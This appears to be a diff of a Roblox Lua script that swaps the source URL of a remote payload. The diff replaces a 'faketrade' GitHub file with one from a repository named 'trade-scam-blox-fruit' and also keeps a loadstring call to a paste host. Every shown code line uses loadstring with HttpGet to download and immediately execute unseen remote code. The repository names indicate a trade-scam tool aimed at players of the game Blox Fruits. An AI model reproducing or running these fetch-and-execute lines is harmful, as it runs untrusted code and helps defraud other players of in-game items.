@@ -36,7 +36,7 @@ repeat task.wait() until game:IsLoaded()
 
 loadstring(game:HttpGet(
 
- "https://raw.githubusercontent.com/PhatLee877/faketrade/refs/heads/main/ScriptByPhatLee"
+ "https://raw.githubusercontent.com/mrbeeder/trade-scam-blox-fruit/refs/heads/main/tradebloxfruitv2"
 
 ))()
 
@@ -242,7 +242,7 @@ end
 
 loadstring(game:HttpGet(
 
- "https://raw.githubusercontent.com/PhatLee877/faketrade/refs/heads/main/ScriptByPhatLee"
+ "https://raw.githubusercontent.com/mrbeeder/trade-scam-blox-fruit/refs/heads/main/tradebloxfruitv2"
 
 ))()
 
@@ -251,5 +251,6 @@ loadstring(game:HttpGet(
  "https://api.rubis.app/v2/scrap/292QJscB5U1ohVBT/raw",
 
  true
+
 
 ))()
